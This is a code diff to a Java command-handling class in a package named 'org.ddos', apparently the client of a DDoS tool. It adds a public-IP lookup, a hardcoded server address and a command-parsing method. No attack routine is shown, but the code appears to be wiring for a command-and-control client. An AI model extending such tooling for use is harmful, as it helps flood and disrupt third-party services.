@@ -1,5 +1,10 @@
 package org.ddos.client.command;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.URL;
+
 import org.ddos.network.ClientNetwork;
 import org.jcom.Command;
 import org.jcom.CommandCompletionListener;
@@ -7,6 +12,7 @@ import org.jcom.CommandData;
 import org.jcom.CommandInterface;
 import org.jcom.CommandInterruptedException;
 import org.jcom.FlagData;
+import org.jcom.Interpreter;
 import org.jcom.InvalidCommandArgumentsException;
 import org.jcom.UnknownCommandException;
 import org.jcom.UnknownFlagException;
@@ -16,6 +22,14 @@ public class ClientCommands {
 	private CommandInterface commands = new CommandInterface();
 
 	public ClientCommands() {
+		try (BufferedReader in = new BufferedReader(
+				new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream()))) {
+			commands.addInterpreter(new Interpreter("%this%", in.readLine()));
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		commands.addInterpreter(new Interpreter("%server%", "server2.jacobsrandomsite.com:25565"));
+
 		commands.addCommandCompletionListener(new CommandCompletionListener() {
 			@Override
 			public void commandCompleted(Command c, CommandData d) {
@@ -104,5 +118,9 @@ public class ClientCommands {
 
 	public CommandData[] getCommandData(String baseCommand) throws UnknownCommandException {
 		return commands.getCommandData(baseCommand);
+	}
+
+	public Command parseCommand(String raw) {
+		return commands.parseCommand(raw);
 	}
 }
